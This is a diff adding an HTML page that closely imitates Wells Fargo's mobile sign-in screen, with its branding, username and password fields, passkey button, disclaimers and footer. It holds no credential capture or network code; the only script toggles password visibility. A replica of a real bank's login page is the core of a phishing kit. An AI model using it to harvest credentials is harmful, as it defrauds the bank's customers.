@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Sign In</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      padding: 24px 0;
+      color: #222;
+    }
+
+    .phone-frame {
+      width: 430px;
+      max-width: 100%;
+      background: #f7f7f7;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      overflow: hidden;
+      min-height: 100vh;
+    }
+
+    .topbar {
+      background: #b31b1b;
+      color: white;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 18px;
+      position: relative;
+      letter-spacing: 0.5px;
+    }
+
+    .topbar::after {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: #f2b632;
+    }
+
+    .menu {
+      position: absolute;
+      right: 16px;
+      top: 11px;
+      width: 38px;
+      height: 28px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .menu span {
+      display: block;
+      height: 4px;
+      background: white;
+      border-radius: 2px;
+    }
+
+    .content {
+      padding: 24px 18px 40px;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 34px;
+      font-weight: 400;
+      margin: 12px 0 28px;
+      font-family: Georgia, serif;
+    }
+
+    .input-wrap {
+      position: relative;
+      margin-bottom: 12px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 20px 18px;
+      font-size: 18px;
+      border: 1.5px solid #b9b0b0;
+      border-radius: 22px;
+      outline: none;
+      background: white;
+    }
+
+    .show-btn {
+      position: absolute;
+      right: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      border: none;
+      background: none;
+      color: #4c3fb1;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .save-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 18px 0 10px;
+      font-size: 18px;
+    }
+
+    .save-row input {
+      width: 28px;
+      height: 28px;
+    }
+
+    .helper-text {
+      font-size: 12px;
+      line-height: 1.45;
+      color: #555;
+      margin-bottom: 28px;
+    }
+
+    .sign-btn {
+      width: 62%;
+      margin: 0 auto;
+      display: block;
+      padding: 16px;
+      border: none;
+      border-radius: 28px;
+      background: #d9d3d3;
+      color: #b3aaaa;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: not-allowed;
+    }
+
+    .or {
+      text-align: center;
+      margin: 10px 0 14px;
+      font-size: 18px;
+    }
+
+    .passkey-btn {
+      width: 58%;
+      margin: 0 auto 22px;
+      display: block;
+      padding: 14px 18px;
+      border: none;
+      border-radius: 28px;
+      background: #111;
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .passkey-note {
+      font-size: 14px;
+      line-height: 1.45;
+      color: #333;
+      margin-bottom: 42px;
+    }
+
+    .link-row {
+      text-align: center;
+      font-size: 16px;
+      margin-bottom: 48px;
+    }
+
+    .link-row a {
+      color: #5a46c2;
+      text-decoration: none;
+    }
+
+    .info-box {
+      border: 1px solid #cfcfcf;
+      background: #fbfbfb;
+      padding: 16px;
+      margin-bottom: 28px;
+    }
+
+    .info-box h2 {
+      font-size: 22px;
+      margin-bottom: 12px;
+      font-family: Georgia, serif;
+    }
+
+    .info-box ul {
+      padding-left: 20px;
+      line-height: 1.35;
+      font-size: 16px;
+    }
+
+    .info-box li {
+      margin-bottom: 12px;
+    }
+
+    .fdic {
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 18px;
+      color: #333;
+    }
+
+    footer {
+      border-top: 1px solid #d6d6d6;
+      background: #f1ecec;
+      padding: 22px 18px 28px;
+    }
+
+    .footer-links {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 22px 24px;
+      font-size: 13px;
+      margin-bottom: 26px;
+    }
+
+    .footer-links a {
+      text-decoration: none;
+      color: #333;
+      line-height: 1.3;
+    }
+
+    .copyright {
+      border-top: 1px solid #c9c9c9;
+      padding-top: 18px;
+      font-size: 13px;
+      color: #333;
+      line-height: 1.45;
+    }
+
+    @media (max-width: 480px) {
+      .phone-frame {
+        width: 100%;
+        border-radius: 0;
+        min-height: 100vh;
+      }
+
+      .sign-btn,
+      .passkey-btn {
+        width: 70%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="phone-frame">
+    <div class="topbar">
+      WELLS FARGO
+      <div class="menu" aria-label="menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </div>
+
+    <div class="content">
+      <h1>Good morning</h1>
+
+      <div class="input-wrap">
+        <input type="text" placeholder="Username" />
+      </div>
+
+      <div class="input-wrap">
+        <input id="password" type="password" placeholder="Password" />
+        <button class="show-btn" onclick="togglePassword()">Show</button>
+      </div>
+
+      <label class="save-row">
+        <input type="checkbox" />
+        <span>Save username</span>
+      </label>
+
+      <p class="helper-text">
+        To help keep your account secure, save your username only on devices that aren't used by other people.
+      </p>
+
+      <button class="sign-btn" disabled>Sign on</button>
+
+      <div class="or">or</div>
+
+      <button class="passkey-btn">Use a passkey</button>
+
+      <p class="passkey-note">
+        Don't have one? Create a passkey after signing on and skip the password next time.
+      </p>
+
+      <div class="link-row">
+        → <a href="#">Forgot username or password?</a>
+      </div>
+
+      <div class="info-box">
+        <h2>Investment and Insurance Products</h2>
+        <ul>
+          <li>Not a deposit or other obligation of the bank.</li>
+          <li>Not guaranteed by the bank or any bank affiliate.</li>
+          <li>Subject to investment risks, including possible loss of principal.</li>
+        </ul>
+      </div>
+
+      <p class="fdic">
+        Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+      </p>
+    </div>
+
+    <footer>
+      <div class="footer-links">
+        <a href="#">About Us</a>
+        <a href="#">Report Email Fraud</a>
+        <a href="#">Online Access Agreement</a>
+        <a href="#">Security Center</a>
+        <a href="#">Privacy, Cookies, Security &amp; Legal</a>
+        <a href="#">Sitemap</a>
+        <a href="#">Do not sell or share my personal information</a>
+        <a href="#">Give Us Feedback</a>
+        <a href="#">Notice of Data Collection</a>
+      </div>
+
+      <div class="copyright">
+       © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const password = document.getElementById("password");
+      const btn = document.querySelector(".show-btn");
+
+      if (password.type === "password") {
+        password.type = "text";
+        btn.textContent = "Hide";
+      } else {
+        password.type = "password";
+        btn.textContent = "Show";
+      }
+    }
+  </script>
+</body>
+</html>
